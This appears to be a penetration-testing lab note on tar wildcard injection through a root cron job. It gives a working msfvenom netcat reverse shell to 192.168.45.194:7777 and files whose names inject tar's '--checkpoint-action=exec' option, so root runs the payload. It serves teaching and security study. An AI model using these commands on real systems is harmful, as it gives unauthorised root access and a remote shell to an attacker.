# Wildcard Injection



## Tar wildcard Injection



### Abusing crontab wildcard

Let's say we encounter the following crontab:

```bash
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
*/2 * * * * root cd /opt/admin && tar -zxf /tmp/backup.tar.gz *
```

This type of situation is an error made by the creator of the crontab. This command try to extract every file in the current directory.&#x20;

### Exploitation

We can exploit this by creating filenames that are tar commands:

#### Create netcat reverse shell:

```bash
kali@kali$ msfvenom -p cmd/unix/reverse_netcat lhost=192.168.45.194 LPORT=7777

Payload size: 104 bytes
mkfifo /tmp/kghpgks; nc 192.168.45.194 7777 0</tmp/kghpgks | /bin/sh >/tmp/kghpgks 2>&1; rm /tmp/kghpgks
```

#### Adding malicious filenames

```bash
victim@box:/opt/admin$ echo "mkfifo /tmp/kghpgks; nc 192.168.45.194 7777 0</tmp/kghpgks | /bin/sh >/tmp/kghpgks 2>&1; rm /tmp/kghpgks" >> shell.sh

victim@box:/opt/admin$ echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint-action=exec=sh shell.sh"

victim@box:/opt/admin$ echo "" > --checkpoint=1
echo "" > --checkpoint=1

total 20
drwxr-xr-x 2 victim victim 4096 Jan 15 21:39 .
drwxr-xr-x 3 root   root   4096 Nov  2  2022 ..
-rw-rw-r-- 1 victim victim    1 Jan 15 21:39 --checkpoint=1
-rw-rw-r-- 1 victim victim    1 Jan 15 21:39 --checkpoint-action=exec=sh shell.sh
-rw-rw-r-- 1 victim victim  105 Jan 15 21:38 shell.sh

```



#### Success!&#x20;

The resulting command now runs:

```bash
CMD: UID=0     PID=28068  | tar -zxf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh shell.sh
```
